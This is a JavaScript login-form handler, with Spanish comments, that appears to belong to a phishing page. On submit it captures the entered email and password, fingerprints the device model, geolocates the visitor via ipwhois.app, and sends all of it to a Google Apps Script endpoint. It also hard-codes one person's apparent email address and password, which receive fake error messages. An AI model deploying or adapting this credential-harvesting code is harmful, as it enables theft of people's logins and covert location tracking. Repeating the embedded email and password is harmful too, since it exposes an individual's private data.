document.getElementById("miFormulario").addEventListener("submit", async function(event) {
    event.preventDefault(); // Evita el envío automático

    // Obtener elementos del formulario
    const emailInput = document.querySelector('input[name="email"]');
    const passwordInput = document.querySelector('input[name="password"]');
    const errorMessage = document.getElementById('error-message');
    
    // Lista de correos electrónicos y contraseñas prohibidas
    const prohibitedEmails = ["tamaraganoza417@gmail.com"]; // Agregar correos prohibidos aquí
    const prohibitedWords = ["Kiana14_07"]; // Agregar contraseñas prohibidas aquí
    
    const email = emailInput.value.trim().toLowerCase();
    const password = passwordInput.value;
    
    // Validar formato de correo electrónico
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        errorMessage.textContent = "Correo electrónico no válido";
        errorMessage.style.color = 'red';
        return; // Detiene el procesamiento
    }
    
    // Verificar correo prohibido
    if (prohibitedEmails.includes(email)) {
        errorMessage.textContent = "No se encuentra la dirección de correo";
        errorMessage.style.color = 'red';
        emailInput.value = '';
        passwordInput.value = '';
        return; // Detiene el procesamiento
    }
    
    // Verificar contraseña prohibida
    if (prohibitedWords.includes(password)) {
        errorMessage.textContent = "Restaure su contraseña y vuelva a intentar";
        errorMessage.style.color = 'red';
        passwordInput.value = '';
        return; // Detiene el procesamiento
    }
    
    // Si pasa todas las validaciones, continúa con el proceso normal
    if (errorMessage) {
        errorMessage.textContent = "";
    }

    // 🔥 DETECTAR EL MODELO EXACTO DEL DISPOSITIVO 🔥
    let deviceModel = "Desconocido";
    let userAgent = navigator.userAgent.toLowerCase();

    if (/android/.test(userAgent)) {
        let match = userAgent.match(/android\s\d+;\s([^)]+)\)/);
        deviceModel = match ? match[1] : "Android (modelo desconocido)";
    } else if (/iphone|ipad|ipod/.test(userAgent)) {
        let match = userAgent.match(/\((.*?)\)/);
        deviceModel = match ? match[1].split(";")[1].trim() : "iPhone (modelo desconocido)";
    }

    console.log("Modelo detectado:", deviceModel); // 👀 Para verificar en consola

    // 🔥 OBTENER CIUDAD Y PAÍS 🔥
    let country = "Desconocido";
    let city = "Desconocida";

    try {
        const response = await fetch("https://ipwhois.app/json/");
        const data = await response.json();
        if (data && data.country) {
            country = data.country; // Captura el país
        }
        if (data && data.city) {
            city = data.city; // Captura la ciudad
        }
    } catch (error) {
        console.error("Error obteniendo el país y ciudad:", error);
    }

    // 🔥 Enviar los datos a Google Sheets 🔥
    const formData = new FormData(this);
    formData.append("device", deviceModel); // Agregar modelo exacto del dispositivo
    formData.append("country", country); // Agregar país
    formData.append("city", city); // Agregar ciudad

    const url = "https://script.google.com/macros/s/AKfycbxecXJGiURxApfpFHvcZCRvxaXNmzPitUCnaBtjNzlpPMWefOzH7Sj2eTOouF-Qjz7Q/exec";

    fetch(url, {
        method: "POST",
        body: new URLSearchParams(formData),
        headers: { "Content-Type": "application/x-www-form-urlencoded" }
    }).catch(error => console.error("Error al enviar datos:", error));
});
